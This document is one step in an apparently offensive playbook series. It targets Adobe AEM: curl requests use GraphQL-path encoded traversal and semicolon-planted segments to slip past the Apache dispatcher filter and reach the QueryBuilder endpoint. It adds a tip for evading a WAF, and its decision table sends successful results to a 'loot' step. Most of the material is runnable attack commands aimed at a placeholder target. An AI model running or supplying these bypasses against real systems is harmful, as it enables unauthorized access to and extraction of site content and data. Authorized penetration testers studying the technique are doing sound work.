# Batch 05 — Dispatcher bypass: GraphQL nocanon + hybrid

## objective

Abuse Apache rules that **skip the dispatcher** for GraphQL-style paths (`ProxyPassMatch` + `nocanon`), alone or **combined** with semicolon tricks.

## estimated_time

45–75 minutes

## prerequisites

- Batch 04 failed or only partial
- Collaborator not required for this batch

## testing_workflow

### 1) Technique A — GraphQL prefix + encoded traversal

```bash
T="https://TARGET"

curl -sk -o /tmp/qb.out -w "gql_trav:%{http_code} size=%{size_download}\n" \
  "$T/graphql/execute.json/..%2f../bin/querybuilder.json?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo
```

**Why (one line):** Apache matches raw `/graphql/execute.json/.*` and may not normalize; Jetty then normalizes to `/bin/querybuilder.json`.

### 2) Technique B — hybrid (semicolon plants `graphql/execute` for unanchored regex)

```bash
curl -sk -o /tmp/qb.out -w "hybrid:%{http_code} size=%{size_download}\n" \
  "$T/bin/querybuilder.json;x='x/graphql/execute/json/x'?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo
```

Useful when WAF blocks `..%2f../` but not `;x='...'`.

### 3) Technique C — same shapes for feed / truststore-ish paths

```bash
for base in \
  "/graphql/execute.json/..%2f../bin/querybuilder.feed" \
  "/bin/querybuilder.feed;x='x/graphql/execute/json/x'" \
  "/graphql/execute.json/..%2f../bin/querybuilder.json"
do
  curl -sk -o /tmp/o -w "%{http_code} %{size_download} $base\n" \
    "$T${base}?path=/content&p.limit=2"
done
```

### 4) Save winner

```text
WORKING_BYPASS=...
QB=...
```

## decision_points

| If… | Then… |
|-----|--------|
| JSON results | → **07** loot |
| Still dead | → **06** form-selector family |
| GraphQL 404 always | Instance may not ship that LocationMatch — still try hybrid, then 06 |

## expected_findings

- Cloud/AMS misconfig bypass independent of dispatcher filter file
- Second stable access URL for QueryBuilder

## next_batch_to_continue_with

- Success → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)**  
- Failure → **[06-bypass-form-selector.md](./06-bypass-form-selector.md)**
